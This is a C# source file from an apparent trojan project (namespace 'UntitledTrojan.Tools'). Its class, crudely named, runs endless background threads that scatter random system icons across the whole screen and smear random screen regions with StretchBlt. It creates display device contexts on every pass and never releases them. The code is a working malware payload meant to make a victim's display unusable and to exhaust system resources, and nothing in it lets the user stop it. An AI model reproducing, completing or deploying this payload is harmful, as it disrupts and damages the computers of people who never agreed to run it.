using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace UntitledTrojan.Tools
{
    internal class DisplayFuck
    {
        [DllImport("gdi32")]
        internal static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, string lpInitData);

        [DllImport("user32")]
        internal static extern int GetSystemMetrics(int smIndex);

        internal static int width = GetSystemMetrics(0);
        internal static int height = GetSystemMetrics(1);

        [DllImport("gdi32.dll")]
        internal static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);

        [DllImport("user32.dll")]
        internal static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);

        [DllImport("user32.dll")]
        internal static extern bool DrawIcon(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon);

        [DllImport("gdi32.dll")]
        internal static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask, int yMask);

        [DllImport("user32")]
        internal static extern bool GetCursorPos(out POINT lpPoint);

        internal struct POINT
        {
            public int x;
            public int y;
        }

        internal static void StartWarn()
        {
            new Thread(() => {
                while (true)
                {
                    Random random = new Random();
                    IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                    IntPtr icon = LoadIcon(IntPtr.Zero, random.Next(32512, 32518));
                    DrawIcon(hdc, random.Next(0, width), random.Next(0, height), icon);
                }
            }).Start();
        }

        internal static void StartGlitch()
        {
            new Thread(() => {
                while (true)
                {
                    IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                    Random random = new Random();
                    int x1 = random.Next(0, width);
                    int y1 = random.Next(0, height);
                    int x2 = random.Next(0, width);
                    int y2 = random.Next(0, height);
                    int w = random.Next(0, 300);
                    int h = random.Next(0, 300);
                    int w2 = random.Next(0, width);
                    int h2 = random.Next(0, height);
                    StretchBlt(hdc, x1, y1, w, h, hdc, x2, y2, w2, h2, 0x00660046);
                }
            }).Start();
        }
    }
}
